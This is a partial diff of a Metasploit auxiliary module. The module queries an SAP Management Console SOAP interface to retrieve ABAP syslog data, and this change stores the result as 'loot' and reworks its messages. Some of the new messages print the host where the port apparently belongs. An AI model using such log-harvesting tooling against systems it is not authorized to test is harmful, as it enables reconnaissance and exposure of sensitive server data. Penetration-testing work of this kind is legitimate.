@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('LFILE', [true, 'Set path to save output to file', 'abapsyslog']),
 			], self.class)
 		register_autofilter_ports([ 50013 ])
-		deregister_options('RHOST')
+		deregister_options('RHOST', 'LFILE')
 	end
 
 	def rport
@@ -60,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def extractabap(rhost)
 		verbose = datastore['VERBOSE']
-		print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
+		print_status("#{rhost}:#{rhost} [SAP] Connecting to SAP Management Console SOAP Interface")
 		success = false
 		
 		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
@@ -99,33 +99,26 @@ class Metasploit3 < Msf::Auxiliary
 			elsif res.code == 500
 				case res.body
 				when /<faultstring>(.*)<\/faultstring>/i
-					faultcode = "#{$1}"
+					faultcode = $1.strip
 					fault = true
 				end
 			end
 
 		rescue ::Rex::ConnectionError
-			print_error("[SAP] Unable to attempt authentication")
-			return :abort
+			print_error("#{rhost}:#{rhost} [SAP] Unable to connect")
+			return
 		end
 
 		if success
-			print_status("[SAP] ABAP syslog downloading to: #{datastore['LFILE']}")
-
-			outputfile = datastore['LFILE'] + "_" + datastore['RHOST']
-			print_status("Writing local file " + outputfile + " in XML format")
-
-			File.open(outputfile,'ab') do |f|
-				f << res.body
-			end
-			
-			print_good("Saved file " + outputfile)
+			print_status("#{rhost}:#{rport} [SAP] ABAP syslog downloading")
+			print_status("#{rhost}:#{rport} [SAP] Storing looted SAP ABAP syslog XML file")
+			store_loot("sap.abap.syslog", "text/xml", rhost, res.body, "sap_abap_syslog.xml", "SAP ABAP syslog")
 
 		elsif fault
-			print_error("[SAP] Errorcode: #{faultcode}")
+			print_error("#{rhost}:#{rport} [SAP] Errorcode: #{faultcode}")
 			return
 		else
-			print_error("[SAP] failed to access ABAPSyslog")
+			print_error("#{rhost}:#{rport} [SAP] failed to access ABAPSyslog")
 			return
 		end
 	end
